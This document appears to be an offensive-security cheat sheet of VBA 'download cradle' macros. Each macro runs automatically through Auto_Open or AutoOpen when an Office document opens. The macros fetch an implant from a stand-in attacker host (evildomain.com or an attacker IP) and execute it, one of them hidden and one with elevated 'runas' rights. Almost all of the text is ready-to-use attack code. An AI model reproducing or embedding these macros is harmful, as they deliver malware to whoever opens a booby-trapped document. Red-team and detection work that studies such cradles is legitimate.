# Download Cradle

## `URLDownloadToFile`

### VBA

```vbscript
Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _
(ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, _
ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long

Sub DownloadFile()
	Call URLDownloadToFile(0, "http[s]://<IP>", "C:\path\to\file", 0, 0)
End Sub
```

```vbscript
Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
    (ByVal pCaller As LongPtr, _
    ByVal szURL As String, _
    ByVal szFileName As String, _
    ByVal dwReserved As LongPtr, _
    ByVal lpfnCB As LongPtr) As LongPtr

Sub Auto_Open()

    Dim S As LongPtr

    ' Download the first file from the specified URL
    S = URLDownloadToFile(0, "http://evildomain.com/filez/implant.exe", _
        "C:\ProgramData\psfire.exe", 0, 0)

    ' Download the second file from the specified URL
    S = URLDownloadToFile(0, "http://evildomain.com/filez/System.Management.Automation.dll", _
        "C:\ProgramData\System.Management.Automation.dll", 0, 0)

    ' Change the directory to C:\ProgramData
    ChDir "C:\ProgramData"

    ' Execute the downloaded file
    Shell "C:\ProgramData\implant.exe", 0

End Sub
```

## `MSXML2.XMLHTTP`

### VBA

```vbscript
Sub AutoOpen()
    Set WObject = CreateObject("WScript.Shell")

    ' Change these
    FileURL = "http://<attacker_IP>[:<PORT>]/implant.bat"
    FileLocation = "C:\Users\Public\Documents\implant.bat"
    Execute_Command = """C:\Users\Public\Documents\implant.bat"""

    'Fetch the file

    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")

    objXMLHTTP.Open "GET", FileURL, False objXMLHTTP.send

    If objXMLHTTP.Status = 200 Then
        Set objADOStream = CreateObject("ADODB.Stream")
        objADOStream.Open
        objADOStream.Type = 1 'adTypeBinary

    objADOStream.Write objXMLHTTP.ResponseBody
        objADOStream.Position = 0 'Set the stream position to the start

    Set objFSO = CreateObject("Scripting.FileSystemObject")
        If objFSO.Fileexists(FileLocation) Then objFSO.DeleteFile FileLocation
    Set objFSO = Nothing

    objADOStream.SaveToFile FileLocation
        objADOStream.Close
        Shell Execute_Command
        Set objADOStream = Nothing

        End If

    Set objXMLHTTP = Nothing
End Sub
```


```vbscript
Sub AutoOpen()
    ' https://www.automateexcel.com/vba/shell/
    Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
    Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
    xHttp.Open "GET", "http[s]://<IP>/payload.bat", False
    xHttp.Send

    with bStrm
        .Type = 1 ' binary
        .Open
        .write xHttp.responseBody
        .savetofile "implant.bat", 2 ' overwrite
    End With

    Set objShell = CreateObject("Shell.Application")
    objShell.ShellExecute "implant.bat", "", "", "runas", 0
End Sub
```

---
## References

- [MalAPI: `URLDownloadToFile`](https://malapi.io/winapi/URLDownloadToFile)